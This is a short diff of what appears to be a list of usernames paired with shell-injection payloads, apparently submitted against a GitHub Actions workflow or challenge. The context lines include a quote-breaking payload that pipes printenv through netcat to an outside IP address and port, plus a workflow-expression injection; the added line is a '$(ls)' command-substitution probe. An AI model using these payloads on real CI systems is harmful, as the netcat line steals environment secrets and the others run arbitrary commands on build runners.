@@ -643,3 +643,4 @@ Resery:50000 50001 50002 50003 50004 50005 50006 50007 50008 50009 50010 50011 5
 weinull:${{ github.event.issue.number }} $( flag )
 zwh-china:";echo "$(printenv|nc 106.15.74.181 2333)"
 
+FireCC:$(ls)
